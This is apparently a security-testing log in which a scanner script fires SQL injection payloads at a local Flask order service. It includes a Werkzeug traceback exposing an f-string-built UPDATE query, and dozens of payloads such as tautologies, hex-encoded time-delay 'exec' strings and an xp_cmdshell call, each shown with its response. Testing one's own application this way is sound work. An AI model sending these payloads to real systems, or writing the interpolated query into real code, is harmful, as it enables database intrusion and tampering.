<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-1754719175152">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1484</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()
<span class="ws">                </span>     ^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-1754719174720">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1469</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-1754719175728">
  <h4>File <cite class="filename">"E:\classPro\1204Pro\orderApp\server.py"</cite>,
      line <em class="line">116</em>,
      in <code class="function">create</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>sql = f&#39;update goods set count = {goods_count - request.json[&#34;goods_count&#34;]} where goods_id = %s&#39;</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>info(f&#39;{client_connect}: execute sql &gt;&gt;{sql}&#39;)</pre>
<pre class="line before"><span class="ws">    </span>val = (request.json[&#39;goods_id&#39;],)</pre>
<pre class="line current"><span class="ws">    </span>cursor.execute(sql, val)
<span class="ws">    </span>^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">    </span>conn.commit()</pre>
<pre class="line after"><span class="ws">    </span>info(f&#39;{client_connect}: execute success&#39;)</pre>
<pre class="line after"><span class="ws">    </span># 生成订单 存储订单数据</pre>
<pre class="line after"><span class="ws">    </span>order_id = &#39;OI&#39; + str(int(time.time() * 1000000))</pre>
<pre class="line after"><span class="ws">    </span>info(f&#39;{client_connect}: order_id &gt;&gt; {order_id}&#39;)</pre></div>
</div>

<li><div class="frame" id="frame-1754719175872">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\dbutils\steady_db.py"</cite>,
      line <em class="line">691</em>,
      in <code class="function">tough_method</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                        </span>con2.close()</pre>
<pre class="line before"><span class="ws">                    </span>except Exception:</pre>
<pre class="line before"><span class="ws">                        </span>pass</pre>
<pre class="line before"><span class="ws">                </span>if transaction:</pre>
<pre class="line before"><span class="ws">                    </span>self._transaction = False</pre>
<pre class="line current"><span class="ws">                </span>raise error  # re-raise the original error again
<span class="ws">                </span>^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>else:</pre>
<pre class="line after"><span class="ws">                </span>con._usage += 1</pre>
<pre class="line after"><span class="ws">                </span>return result</pre>
<pre class="line after"><span class="ws">        </span>return tough_method</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754719175584">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\dbutils\steady_db.py"</cite>,
      line <em class="line">610</em>,
      in <code class="function">tough_method</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                        </span>and not transaction):</pre>
<pre class="line before"><span class="ws">                    </span>raise con._failure</pre>
<pre class="line before"><span class="ws">                </span>if execute:</pre>
<pre class="line before"><span class="ws">                    </span>self._setsizes()</pre>
<pre class="line before"><span class="ws">                </span>method = getattr(self._cursor, name)</pre>
<pre class="line current"><span class="ws">                </span>result = method(*args, **kwargs)  # try to execute
<span class="ws">                </span>         ^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">                </span>if execute:</pre>
<pre class="line after"><span class="ws">                    </span>self._clearsizes()</pre>
<pre class="line after"><span class="ws">            </span>except con._failures as error:  # execution error</pre>
<pre class="line after"><span class="ws">                </span>if not transaction:</pre>
<pre class="line after"><span class="ws">                    </span>try:</pre></div>
</div>

<li><div class="frame" id="frame-1754719176448">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\cursors.py"</cite>,
      line <em class="line">158</em>,
      in <code class="function">execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>while self.nextset():</pre>
<pre class="line before"><span class="ws">            </span>pass</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>query = self.mogrify(query, args)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line current"><span class="ws">        </span>result = self._query(query)
<span class="ws">        </span>         ^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._executed = query</pre>
<pre class="line after"><span class="ws">        </span>return result</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def executemany(self, query, args):</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Run several data against one query.</pre></div>
</div>

<li><div class="frame" id="frame-1754719176592">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\cursors.py"</cite>,
      line <em class="line">325</em>,
      in <code class="function">_query</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.rownumber = r</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def _query(self, q):</pre>
<pre class="line before"><span class="ws">        </span>conn = self._get_db()</pre>
<pre class="line before"><span class="ws">        </span>self._clear_result()</pre>
<pre class="line current"><span class="ws">        </span>conn.query(q)
<span class="ws">        </span>^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._do_get_result()</pre>
<pre class="line after"><span class="ws">        </span>return self.rowcount</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def _clear_result(self):</pre>
<pre class="line after"><span class="ws">        </span>self.rownumber = 0</pre></div>
</div>

<li><div class="frame" id="frame-1754719176736">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">549</em>,
      in <code class="function">query</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span># if DEBUG:</pre>
<pre class="line before"><span class="ws">        </span>#     print(&#34;DEBUG: sending query:&#34;, sql)</pre>
<pre class="line before"><span class="ws">        </span>if isinstance(sql, str):</pre>
<pre class="line before"><span class="ws">            </span>sql = sql.encode(self.encoding, &#34;surrogateescape&#34;)</pre>
<pre class="line before"><span class="ws">        </span>self._execute_command(COMMAND.COM_QUERY, sql)</pre>
<pre class="line current"><span class="ws">        </span>self._affected_rows = self._read_query_result(unbuffered=unbuffered)
<span class="ws">        </span>                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return self._affected_rows</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def next_result(self, unbuffered=False):</pre>
<pre class="line after"><span class="ws">        </span>self._affected_rows = self._read_query_result(unbuffered=unbuffered)</pre>
<pre class="line after"><span class="ws">        </span>return self._affected_rows</pre></div>
</div>

<li><div class="frame" id="frame-1754719176880">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">779</em>,
      in <code class="function">_read_query_result</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                </span>result.unbuffered_active = False</pre>
<pre class="line before"><span class="ws">                </span>result.connection = None</pre>
<pre class="line before"><span class="ws">                </span>raise</pre>
<pre class="line before"><span class="ws">        </span>else:</pre>
<pre class="line before"><span class="ws">            </span>result = MySQLResult(self)</pre>
<pre class="line current"><span class="ws">            </span>result.read()
<span class="ws">            </span>^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._result = result</pre>
<pre class="line after"><span class="ws">        </span>if result.server_status is not None:</pre>
<pre class="line after"><span class="ws">            </span>self.server_status = result.server_status</pre>
<pre class="line after"><span class="ws">        </span>return result.affected_rows</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754719177024">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">1157</em>,
      in <code class="function">read</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>if self.unbuffered_active:</pre>
<pre class="line before"><span class="ws">            </span>self._finish_unbuffered_query()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def read(self):</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line current"><span class="ws">            </span>first_packet = self.connection._read_packet()
<span class="ws">            </span>               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">            </span>if first_packet.is_ok_packet():</pre>
<pre class="line after"><span class="ws">                </span>self._read_ok_packet(first_packet)</pre>
<pre class="line after"><span class="ws">            </span>elif first_packet.is_load_local_packet():</pre>
<pre class="line after"><span class="ws">                </span>self._read_load_local_packet(first_packet)</pre></div>
</div>

<li><div class="frame" id="frame-1754719177168">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">729</em>,
      in <code class="function">_read_packet</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>packet = packet_type(bytes(buff), self.encoding)</pre>
<pre class="line before"><span class="ws">        </span>if packet.is_error_packet():</pre>
<pre class="line before"><span class="ws">            </span>if self._result is not None and self._result.unbuffered_active is True:</pre>
<pre class="line before"><span class="ws">                </span>self._result.unbuffered_active = False</pre>
<pre class="line current"><span class="ws">            </span>packet.raise_for_error()
<span class="ws">            </span>^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return packet</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def _read_bytes(self, num_bytes):</pre>
<pre class="line after"><span class="ws">        </span>self._sock.settimeout(self._read_timeout)</pre>
<pre class="line after"><span class="ws">        </span>while True:</pre></div>
</div>

<li><div class="frame" id="frame-1754719177312">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\protocol.py"</cite>,
      line <em class="line">221</em>,
      in <code class="function">raise_for_error</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.rewind()</pre>
<pre class="line before"><span class="ws">        </span>self.advance(1)  # field_count == error (we already know that)</pre>
<pre class="line before"><span class="ws">        </span>errno = self.read_uint16()</pre>
<pre class="line before"><span class="ws">        </span>if DEBUG:</pre>
<pre class="line before"><span class="ws">            </span>print(&#34;errno =&#34;, errno)</pre>
<pre class="line current"><span class="ws">        </span>err.raise_mysql_exception(self._data)
<span class="ws">        </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def dump(self):</pre>
<pre class="line after"><span class="ws">        </span>dump_packet(self._data)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754719177456">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\err.py"</cite>,
      line <em class="line">143</em>,
      in <code class="function">raise_mysql_exception</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>errno = struct.unpack(&#34;&lt;h&#34;, data[1:3])[0]</pre>
<pre class="line before"><span class="ws">    </span>errval = data[9:].decode(&#34;utf-8&#34;, &#34;replace&#34;)</pre>
<pre class="line before"><span class="ws">    </span>errorclass = error_map.get(errno)</pre>
<pre class="line before"><span class="ws">    </span>if errorclass is None:</pre>
<pre class="line before"><span class="ws">        </span>errorclass = InternalError if errno &lt; 1000 else OperationalError</pre>
<pre class="line current"><span class="ws">    </span>raise errorclass(errno, errval)
<span class="ws">    </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
</div>
</ul>
  <blockquote>pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1 waitfor delay &#39;0:0:10&#39;--\n&#39;&#34;)
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2213, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2193, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2190, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1484, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;E:\classPro\1204Pro\orderApp\server.py&#34;, line 116, in create
    cursor.execute(sql, val)
  File &#34;D:\python3\Lib\site-packages\dbutils\steady_db.py&#34;, line 691, in tough_method
    raise error  # re-raise the original error again
  File &#34;D:\python3\Lib\site-packages\dbutils\steady_db.py&#34;, line 610, in tough_method
    result = method(*args, **kwargs)  # try to execute
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\cursors.py&#34;, line 158, in execute
    result = self._query(query)
             ^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\cursors.py&#34;, line 325, in _query
    conn.query(q)
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 549, in query
    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 779, in _read_query_result
    result.read()
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 1157, in read
    first_packet = self.connection._read_packet()
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 729, in _read_packet
    packet.raise_for_error()
  File &#34;D:\python3\Lib\site-packages\pymysql\protocol.py&#34;, line 221, in raise_for_error
    err.raise_mysql_exception(self._data)
  File &#34;D:\python3\Lib\site-packages\pymysql\err.py&#34;, line 143, in raise_mysql_exception
    raise errorclass(errno, errval)
pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1 waitfor delay &#39;0:0:10&#39;--\n&#39;&#34;)
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "D:\python3\Lib\site-packages\flask\app.py", line 2213, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 2193, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 2190, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1484, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\classPro\1204Pro\orderApp\server.py", line 116, in create
    cursor.execute(sql, val)
  File "D:\python3\Lib\site-packages\dbutils\steady_db.py", line 691, in tough_method
    raise error  # re-raise the original error again
  File "D:\python3\Lib\site-packages\dbutils\steady_db.py", line 610, in tough_method
    result = method(*args, **kwargs)  # try to execute
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\cursors.py", line 158, in execute
    result = self._query(query)
             ^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\cursors.py", line 325, in _query
    conn.query(q)
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 549, in query
    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 779, in _read_query_result
    result.read()
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 1157, in read
    first_packet = self.connection._read_packet()
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 729, in _read_packet
    packet.raise_for_error()
  File "D:\python3\Lib\site-packages\pymysql\protocol.py", line 221, in raise_for_error
    err.raise_mysql_exception(self._data)
  File "D:\python3\Lib\site-packages\pymysql\err.py", line 143, in raise_mysql_exception
    raise errorclass(errno, errval)
pymysql.err.OperationalError: (1292, "Truncated incorrect DOUBLE value: '1 waitfor delay '0:0:10'-\n'")


-->

[INFO]00:18:10:168-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)\n"}}
[INFO]00:18:10:169-caseScan.py:113 >> code: 400
[INFO]00:18:10:169-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:18:10:190-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) \n"}}
[INFO]00:18:10:190-caseScan.py:113 >> code: 403
[INFO]00:18:10:191-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:204-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)\n"}}
[INFO]00:18:10:205-caseScan.py:113 >> code: 400
[INFO]00:18:10:205-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:18:10:266-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)\n"}}
[INFO]00:18:10:266-caseScan.py:113 >> code: 403
[INFO]00:18:10:267-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:312-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "a'\n"}}
[INFO]00:18:10:313-caseScan.py:113 >> code: 403
[INFO]00:18:10:314-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:353-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "?\n"}}
[INFO]00:18:10:354-caseScan.py:113 >> code: 403
[INFO]00:18:10:355-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:399-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 1=1\n"}}
[INFO]00:18:10:400-caseScan.py:113 >> code: 403
[INFO]00:18:10:400-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:446-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\u2018 or 1=1 --\n"}}
[INFO]00:18:10:448-caseScan.py:113 >> code: 403
[INFO]00:18:10:448-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:497-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "x' AND userid IS NULL; --\n"}}
[INFO]00:18:10:498-caseScan.py:113 >> code: 403
[INFO]00:18:10:499-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:543-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "x' AND email IS NULL; --\n"}}
[INFO]00:18:10:544-caseScan.py:113 >> code: 403
[INFO]00:18:10:545-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:575-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "anything' OR 'x'='x\n"}}
[INFO]00:18:10:576-caseScan.py:113 >> code: 403
[INFO]00:18:10:576-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:605-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "x' AND 1=(SELECT COUNT(*) FROM tabname); --\n"}}
[INFO]00:18:10:606-caseScan.py:113 >> code: 403
[INFO]00:18:10:606-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:634-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "x' AND members.email IS NULL; --\n"}}
[INFO]00:18:10:635-caseScan.py:113 >> code: 403
[INFO]00:18:10:635-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:662-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "x' OR full_name LIKE '%Bob%\n"}}
[INFO]00:18:10:663-caseScan.py:113 >> code: 403
[INFO]00:18:10:663-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:690-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "23 OR 1=1\n"}}
[INFO]00:18:10:691-caseScan.py:113 >> code: 403
[INFO]00:18:10:691-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:719-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'; exec master..xp_cmdshell 'ping 172.10.1.255'--\n"}}
[INFO]00:18:10:719-caseScan.py:113 >> code: 403
[INFO]00:18:10:720-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:750-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'\n"}}
[INFO]00:18:10:750-caseScan.py:113 >> code: 403
[INFO]00:18:10:751-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:813-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'%20or%20''='\n"}}
[INFO]00:18:10:813-caseScan.py:113 >> code: 403
[INFO]00:18:10:814-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:849-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'%20or%20'x'='x\n"}}
[INFO]00:18:10:849-caseScan.py:113 >> code: 403
[INFO]00:18:10:850-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:884-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%20or%20x=x\n"}}
[INFO]00:18:10:884-caseScan.py:113 >> code: 403
[INFO]00:18:10:885-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:918-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "')%20or%20('x'='x\n"}}
[INFO]00:18:10:919-caseScan.py:113 >> code: 403
[INFO]00:18:10:919-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:951-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "0 or 1=1\n"}}
[INFO]00:18:10:952-caseScan.py:113 >> code: 403
[INFO]00:18:10:953-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:983-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 0=0 --\n"}}
[INFO]00:18:10:983-caseScan.py:113 >> code: 403
[INFO]00:18:10:984-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:013-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\" or 0=0 --\n"}}
[INFO]00:18:11:013-caseScan.py:113 >> code: 403
[INFO]00:18:11:014-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

